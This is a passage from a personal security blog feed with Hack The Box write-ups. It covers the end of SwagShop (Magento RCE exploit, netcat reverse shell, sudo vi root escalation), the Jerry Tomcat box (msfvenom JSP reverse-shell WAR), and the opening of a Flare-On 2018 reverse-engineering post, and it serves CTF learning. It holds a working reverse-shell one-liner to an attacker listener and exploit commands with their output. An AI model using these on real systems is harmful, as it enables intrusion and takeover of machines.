&lt;p&gt;We change the install_date parameter and we add our credentials to the script.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;install_date&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Wed, 08 May 2019 07:23:09 +0000&amp;#39;&lt;/span&gt;  &lt;span class="c1"&gt;# This needs to be the exact date from /app/etc/local.xml&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we launch the script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python sploi.py http://10.10.10.140/index.php/admin &lt;span class="s2"&gt;&amp;quot;uname -a&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:&lt;/span&gt;
&lt;span class="code-line"&gt;  File &lt;span class="s2"&gt;&amp;quot;37811.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;69&lt;/span&gt;, &lt;span class="k"&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nv"&gt;tunnel&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; tunnel.group&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    AttributeError: &lt;span class="s1"&gt;&amp;#39;NoneType&amp;#39;&lt;/span&gt; object has no attribute &lt;span class="s1"&gt;&amp;#39;group&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The error is because in the last 7 days there were no sales. We can change
this parameter in the exploit code (we put 2 years to be safe):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;#request = br.open(url + &amp;#39;block/tab_orders/period/7d/?isAjax=true&amp;#39;, data=&amp;#39;isAjax=false&amp;amp;form_key=&amp;#39; + key)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;request&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;block/tab_orders/period/2y/?isAjax=true&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;isAjax=false&amp;amp;form_key=&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;tunnel&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;src=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;(.*)\?ga=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;tunnel&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tunnel&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We relaunch the script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python sploi.py http://10.10.10.140/index.php/admin &lt;span class="s2"&gt;&amp;quot;uname -a&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Linux swagshop &lt;span class="m"&gt;4&lt;/span&gt;.4.0-146-generic &lt;span class="c1"&gt;#172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;python sploi.py http://10.10.10.140/index.php/admin &lt;span class="s2"&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;www-data&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We get a remote code execution. From there we can get a reverse shell or do
everything only with the RCE. I struggle a bit with the reverse shell before
finding the right one. Therefore I will start with the RCE only exploitation.&lt;/p&gt;
&lt;p&gt;As the box is often reset by other players we chain the two exploit in a bash
script.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python &lt;span class="m"&gt;37977&lt;/span&gt;.py&lt;/span&gt;
&lt;span class="code-line"&gt;python sploi.py http://10.10.10.140/index.php/admin &lt;span class="s2"&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Fron now on I will only write the command of the second script ("whoami" in the
exemple above) and make more than one command by duplicating the line.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We want to get the user flag. In HTB's VM there is always a user flag in
/home/&lt;some user&gt;/user.txt and a root flag in /root/root.txt (at least on the
Linux One). So we look at the user directory:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls /home/&lt;/span&gt;
&lt;span class="code-line"&gt;haris&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We list the user folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls /home/haris/&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And we get the user flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /home/haris/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;a4488&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="lets-get-root"&gt;let's get root&lt;/h3&gt;
&lt;p&gt;We start by enumerating our permissions on the box:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for www-data on swagshop:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User www-data may run the following commands on swagshop:&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /usr/bin/vi /var/www/html/*&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It is well known that Vi let you run system command. Nevertheless we must execute
this command without a shell. For that we can use the vi "-c" option:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python sploi.py http://10.10.10.140/index.php/admin &amp;quot;sudo /usr/bin/vi /var/www/html/1 -c &amp;#39;:! cat /root/root.txt &amp;gt; /tmp/mak/6&amp;#39;&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;python sploi.py http://10.10.10.140/index.php/admin &amp;quot;cat /tmp/mak/6&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;c2b087&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      ___ ___&lt;/span&gt;
&lt;span class="code-line"&gt;    /| |/|\| |\&lt;/span&gt;
&lt;span class="code-line"&gt;  /_| ´ |.` |_\           We are open! (Almost)&lt;/span&gt;
&lt;span class="code-line"&gt;    |   |.  |&lt;/span&gt;
&lt;span class="code-line"&gt;    |   |.  |         Join the beta HTB Swag Store!&lt;/span&gt;
&lt;span class="code-line"&gt;    |___|.__|       https://hackthebox.store/password&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                              PS: Use root flag as password!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="reverse-shell-way"&gt;Reverse shell way&lt;/h2&gt;
&lt;p&gt;There is another way to resolve this part of the box: using a reverse shell!&lt;/p&gt;
&lt;p&gt;My classic python reverse shell was not working as there was no python on the box and
the bash reverse was also not working. Nevertheless, the netcat one was working:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python sploi.py http://10.10.10.140/index.php/admin &lt;span class="s2"&gt;&amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.148 1234 &amp;gt;/tmp/f&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;On the client side we need to open a listener with netcat:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;netcat -lvp &lt;span class="m"&gt;1234&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we got a reverse shell!&lt;/p&gt;
&lt;p&gt;With this reverse shell the commands are the same but faster ;).
We can easily find the user flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls /home/&lt;/span&gt;
&lt;span class="code-line"&gt;haris&lt;/span&gt;
&lt;span class="code-line"&gt;ls /home/haris/&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat /home/haris/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;a44887&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;For the privilege escalation we can just spwan a vi:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for www-data on swagshop:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User www-data may run the following commands on swagshop:&lt;/span&gt;
&lt;span class="code-line"&gt;    (root) NOPASSWD: /usr/bin/vi /var/www/html/*&lt;/span&gt;
&lt;span class="code-line"&gt;$ sudo /usr/bin/vi /var/www/html/1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We get an error about the terminal not being interactive:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Vim: Warning: Output is not to a terminal&lt;/span&gt;
&lt;span class="code-line"&gt;Vim: Warning: Input is not from a terminal&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we just enter the command to get a shell from vi:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;:! /bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;ls /root/&lt;/span&gt;
&lt;span class="code-line"&gt;root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;c2b087&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was really interesting. I learned a lot about magento admin panel. As
the downloader was disabled, the easiest way to execute code on the box was not
available and I had to find other ways to execute code on a magento website from
the admin panel. This might became handy someday.
The privilege escalation was quit easy as I know a lot about vi.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="mangento"></category></entry><entry><title>HTB: Jerry</title><link href="https://maggick.fr/2019/09/htb-jerry.html" rel="alternate"></link><published>2019-09-12T10:25:00+02:00</published><updated>2019-09-12T10:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-09-12:/2019/09/htb-jerry.html</id><summary type="html">&lt;p&gt;&lt;img alt="Jerry card" class="align-left" src="/media/2019.09/jerry_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;I started to work on &lt;a href="www.hackthebox.eu"&gt;Hack The Box&lt;/a&gt; machine in 2018. This is a writeup for the
retired &lt;a href="https://www.hackthebox.eu/home/machines/profile/144"&gt;Jerry&lt;/a&gt; machine.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2019.09/jerry_card.png" alt="Jerry card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;I started to work on &lt;a href="www.hackthebox.eu"&gt;Hack The Box&lt;/a&gt; machine in 2018. This is a writeup for the
retired &lt;a href="https://www.hackthebox.eu/home/machines/profile/144"&gt;Jerry&lt;/a&gt; machine.&lt;/p&gt;


&lt;h1 id="hack-the-box"&gt;Hack the Box&lt;/h1&gt;
&lt;p&gt;In 2018 I started to play with &lt;a href="www.hackthebox.eu"&gt;Hack the box&lt;/a&gt;. The principle
is similar to the &lt;a href="https://www.vulnhub.com/about/"&gt;vulnhub&lt;/a&gt; machines: You got a
VM and have to root it. The main difference is that you are connected to a VPN 
nd the machines are shared between the users. Also, there is only 20 "active" VM
at a time. At the moment there is a total of 128 VM and therefore 108 retired.
Finally, nobody is publishing Writeup before the VM is retired.&lt;/p&gt;
&lt;p&gt;One of the Drawback is that I completely forgot to write and publish this
writeup.&lt;/p&gt;
&lt;p&gt;The Jerry machine is Windows server. This VM is classified as a trivial one. In
fact it is a really easy one.&lt;/p&gt;
&lt;h1 id="network-discovery"&gt;Network discovery&lt;/h1&gt;
&lt;p&gt;As usual, we start with a simple network scan using nmap in order to scan the
open TCP ports: Only the port 8080 is open with an HTTP service.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# nmap -p- 10.10.10.95 -sSV&lt;/span&gt;
&lt;span class="code-line"&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-03 17:38 CET&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.95&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.019s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65534 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap done: 1 IP address (1 host up) scanned in 112.41 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When going to this page we see a simple Tomcat Application Manager.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Tomcat application manager" src="/media/2019.09/jerry_2.png"&gt;&lt;/p&gt;
&lt;h1 id="exploiting-the-administration-interface"&gt;Exploiting the administration interface&lt;/h1&gt;
&lt;p&gt;We generate a Java reverse shell payload using &lt;code&gt;msfvenom&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.14 LPORT=4444 -f war &amp;gt; reverse2.war&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We start the handler using &lt;code&gt;metasploit&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf exploit(multi/handler) &amp;gt; use exploit/multi/handler &lt;/span&gt;
&lt;span class="code-line"&gt;msf exploit(multi/handler) &amp;gt; show options&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Module options (exploit/multi/handler):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name  Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----  ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Payload options (java/jsp_shell_reverse_tcp):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name   Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----   ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  LHOST  10.10.15.14      yes       The listen address (an interface may be specified)&lt;/span&gt;
&lt;span class="code-line"&gt;  LPORT  4444             yes       The listen port&lt;/span&gt;
&lt;span class="code-line"&gt;  SHELL                   no        The system shell to use.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit target:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Id  Name&lt;/span&gt;
&lt;span class="code-line"&gt;  --  ----&lt;/span&gt;
&lt;span class="code-line"&gt;  0   Wildcard Target&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When running the War payload we got a shell as Administrator and we can start
listing the directories looking for the flags:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\apache-tomcat-7.0.88&amp;gt;dir c:\Users&lt;/span&gt;
&lt;span class="code-line"&gt;dir c:\Users&lt;/span&gt;
&lt;span class="code-line"&gt;Volume in drive C has no label.&lt;/span&gt;
&lt;span class="code-line"&gt;Volume Serial Number is FC2B-E489&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Directory of c:\Users&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;06/18/2018  10:31 PM    &amp;lt;DIR&amp;gt;          .&lt;/span&gt;
&lt;span class="code-line"&gt;06/18/2018  10:31 PM    &amp;lt;DIR&amp;gt;          ..&lt;/span&gt;
&lt;span class="code-line"&gt;06/18/2018  10:31 PM    &amp;lt;DIR&amp;gt;          Administrator&lt;/span&gt;
&lt;span class="code-line"&gt;08/22/2013  05:39 PM    &amp;lt;DIR&amp;gt;          Public&lt;/span&gt;
&lt;span class="code-line"&gt;              0 File(s)              0 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;              4 Dir(s)  27,600,285,696 bytes free&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\apache-tomcat-7.0.88&amp;gt;dir c:\Users\Administrator\Desktop\&lt;/span&gt;
&lt;span class="code-line"&gt;dir c:\Users\Administrator\Desktop\&lt;/span&gt;
&lt;span class="code-line"&gt;Volume in drive C has no label.&lt;/span&gt;
&lt;span class="code-line"&gt;Volume Serial Number is FC2B-E489&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Directory of c:\Users\Administrator\Desktop&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;06/19/2018  06:09 AM    &amp;lt;DIR&amp;gt;          .&lt;/span&gt;
&lt;span class="code-line"&gt;06/19/2018  06:09 AM    &amp;lt;DIR&amp;gt;          ..&lt;/span&gt;
&lt;span class="code-line"&gt;06/19/2018  06:09 AM    &amp;lt;DIR&amp;gt;          flags&lt;/span&gt;
&lt;span class="code-line"&gt;              0 File(s)              0 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;              3 Dir(s)  27,600,269,312 bytes free&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\apache-tomcat-7.0.88&amp;gt;dir c:\Users\Administrator\Desktop\flags&lt;/span&gt;
&lt;span class="code-line"&gt;dir c:\Users\Administrator\Desktop\flags&lt;/span&gt;
&lt;span class="code-line"&gt;Volume in drive C has no label.&lt;/span&gt;
&lt;span class="code-line"&gt;Volume Serial Number is FC2B-E489&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As we already are administrator we can read the flag for the two level:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Directory of c:\Users\Administrator\Desktop\flags&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;06/19/2018  06:09 AM    &amp;lt;DIR&amp;gt;          .&lt;/span&gt;
&lt;span class="code-line"&gt;06/19/2018  06:09 AM    &amp;lt;DIR&amp;gt;          ..&lt;/span&gt;
&lt;span class="code-line"&gt;06/19/2018  06:11 AM                88 2 for the price of 1.txt&lt;/span&gt;
&lt;span class="code-line"&gt;              1 File(s)             88 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;              2 Dir(s)  27,600,269,312 bytes free&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\apache-tomcat-7.0.88&amp;gt;type c:\Users\Administrator\Desktop\flags\2*&lt;/span&gt;
&lt;span class="code-line"&gt;type c:\Users\Administrator\Desktop\flags\2*&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;7004dbcef0f854e0fb401875f26ebd00&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;04a8b36e1545a455393d067e772fe90e&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="windows"></category></entry><entry><title>Flare-on Challenge 2018</title><link href="https://maggick.fr/2018/10/flare-on-challenge-2018.html" rel="alternate"></link><published>2018-10-07T11:43:00+02:00</published><updated>2018-10-07T11:43:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2018-10-07:/2018/10/flare-on-challenge-2018.html</id><summary type="html">&lt;p&gt;The fifth edition of the FireEye's Flare-on reverse challenge take place this year between
august 24th and the 5th octobe with a total of 12 challenges centered on Windows
binaries.
&lt;a href="https://www.fireeye.com/blog/threat-research/2018/08/announcing-the-fifth-annual-flare-on-challenge.html"&gt;https://www.fireeye.com/blog/threat-research/2018/08/announcing-the-fifth-annual-flare-on-challenge.html&lt;/a&gt;&lt;/p&gt;
</summary><content type="html">&lt;p&gt;The fifth edition of the FireEye's Flare-on reverse challenge take place this year between
august 24th and the 5th octobe with a total of 12 challenges centered on Windows
binaries.
&lt;a href="https://www.fireeye.com/blog/threat-research/2018/08/announcing-the-fifth-annual-flare-on-challenge.html"&gt;https://www.fireeye.com/blog/threat-research/2018/08/announcing-the-fifth-annual-flare-on-challenge.html&lt;/a&gt;&lt;/p&gt;


&lt;h2 id="minesweeper-championship-registration"&gt;Minesweeper Championship Registration&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to the Fifth Annual Flare-On Challenge! The Minesweeper World
Championship is coming soon and we found the registration app. You weren't
officially invited but if you can figure out what the code is you can probably
get in anyway. Good luck!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="/media/2018.10/flare/MinesweeperChampionshipRegistration.7z"&gt;Download the challenge&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We download the 7z and after extraction we got the jar.
We start jd-gui and load the jar.
The &lt;code&gt;InviteValidator&lt;/code&gt; class is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;javax.swing.JOptionPane&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kd"&gt;public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;InviteValidator&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="kd"&gt;public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;static&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
